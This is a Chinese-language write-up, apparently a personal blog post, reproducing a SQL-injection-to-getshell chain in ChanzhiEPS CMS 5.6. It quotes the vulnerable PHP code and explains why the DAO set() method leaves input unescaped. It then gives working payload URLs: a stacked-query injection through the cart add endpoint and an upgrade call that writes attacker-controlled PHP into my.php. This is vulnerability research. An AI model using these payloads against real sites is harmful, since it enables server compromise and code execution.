>小密圈里的师傅们几乎把蝉知日穿了，好奇心驱使下，我找到了和师傅们一致的版本，果然复现的感觉和单纯的看分析有很大的不同

1. **5.6 从sql注入到getshell**
**原文:**[俊杰师傅原文地址](http://www.yqxiaojunjie.com/index.php/archives/308/)
这个版本的cms在圈里有师傅总结了下，就是其在拼接sql语句时，有些方法会addslash，但是其偏偏遗漏一个方法set()，sql注入就发生在这里
**/system/module/cart/control.php**
```php
    public function add($product, $count)
    {
        if($this->app->user->account == 'guest')
        {
            /* Save info to cookie if user is guest. */
            $this->cart->addInCookie($product, $count);
            $this->send(array('result' => 'success', 'message' => $this->lang->saveSuccess));
        }
        else
        {
            $result = $this->cart->add($product, $count);
            if($result) $this->send(array('result' => 'success', 'message' => $this->lang->saveSuccess));
            $this->send(array('result' => 'fail', 'message' => dao::getError()));
        }
    }
```
**/system/module/cart/model.php**
```php
    public function add($productID, $count)
    {
        $hasProduct = $this->dao->select('count(id) as count')->from(TABLE_CART)->where('account')->eq($this->app->user->account)->andWhere('product')->eq($productID)->fetch('count');

        if(!$hasProduct)
        {
            $product = new stdclass();
            $product->product = $productID;
            $product->account = $this->app->user->account;
            $product->count   = $count;
            $this->dao->insert(TABLE_CART)->data($product)->exec();
        }
        else
        {
            $this->dao->update(TABLE_CART)->set("count= count + {$count}")->where('account')->eq($this->app->user->account)->andWhere('product')->eq($productID)->exec();
        }

        return !dao::isError();
    }
```
**DAO类中描述了所有数据库操作函数/sysytem/lib/base/dao/dao.class.php**
```php
    public function set($set)
    {
        /* Add ` to avoid keywords of mysql. */
        if(strpos($set, '=') ===false)
        {
            $set = str_replace(',', '', $set);
            $set = '`' . str_replace('`', '', $set) . '`';
        }

        $this->sql .= $this->isFirstSet ? " $set" : ", $set";
        if($this->isFirstSet) $this->isFirstSet = false;
        return $this;
    }
```
这里就是一个危险的参数被赤裸的拼接成了sql语句，在原文的利用中是因为url路由被设置为了path_info模式导致不能出现"_"，所以不能控制带有"_"的数据库，俊杰师傅利用pdo支持堆叠查询的特性，声明十六进制编码后的查询变量，再执行，达到控制数据库数据的目的
而，我在拿到cms的时候，第一件事就是把路由设为了get....，因为这样比较好看。所以我只是复现了堆叠的特性
**payload**
```url
http://127.0.0.1/chanzhieps/www/index.php?m=cart&f=add&product=1&count=1;UPDATE eps_config set lang='\'];phpinfo();//' wHeRe `key`  = 'mobileTemplate' --+&t=html
```
```url
http://127.0.0.1/chanzhieps/www/admin.php?m=upgrade&f=processSQL
post:fromVersion=5_5
```
效果**my.php**
```php
$config->framework->detectDevice[''];phpinfo();//'] = true;
```
这里为什么选择upgrade呢，看下文件内容
**/system/module/upgrade/control.php**
```php
    public function processSQL()
    {
        $this->upgrade->execute($this->post->fromVersion);

        $this->upgrade->processCDN();

        $this->view->title = $this->lang->upgrade->result;

        if(!$this->upgrade->isError())
        {
            $this->loadModel('setting')->setItems('system.common.global', array('ignoreUpgrade' => 0));
            $this->view->result = 'success';
        }
        else
        {
            $this->view->result = 'fail';
            $this->view->errors = $this->upgrade->getError();
        }
        $this->display();
    }
}
```
**/system/module/upgrade/model.php**
```php
public function execute($fromVersion)
    {
        switch($fromVersion)
        {
            case '1_0': $this->execSQL($this->getUpgradeFile('1.0'));
            case '1_1': $this->execSQL($this->getUpgradeFile('1.1'));
            case '1_2': $this->execSQL($this->getUpgradeFile('1.2'));
            case '1_3': $this->execSQL($this->getUpgradeFile('1.3'));
            case '1_4': $this->execSQL($this->getUpgradeFile('1.4'));
            case '1_5': 
            .
            .
            .
            case '5_5':
                $this->fixDetectDeviceConfig();
                $this->execSQL($this->getUpgradeFile('5.5'));
```
```php
public function fixDetectDeviceConfig()
    {
        $mobileTemplateConfigList = $this->dao->setAutoLang(false)->select('value, lang')->from(TABLE_CONFIG)
            ->where('`key`')->eq('mobileTemplate')
            ->fetchAll();
        if(!empty($mobileTemplateConfigList))
        {
            $myFile = $this->app->getConfigRoot() . 'my.php';
            file_put_contents($myFile, "\n", FILE_APPEND);
            foreach($mobileTemplateConfigList as $mobileTemplateConfig)
            {
                $fixedConfig = '$config->framework->detectDevice[' . "'{$mobileTemplateConfig->lang}'] = ";
                $fixedConfig .= $mobileTemplateConfig->value == 'open' ? 'true' : 'false';
                $fixedConfig .= ";\n";
                file_put_contents($myFile, $fixedConfig, FILE_APPEND);
            }
        }
    }
}
```
可见，从数据库取出的参数$mobileTemplateConfigList，就是我们可控，并写入文件getshell的内容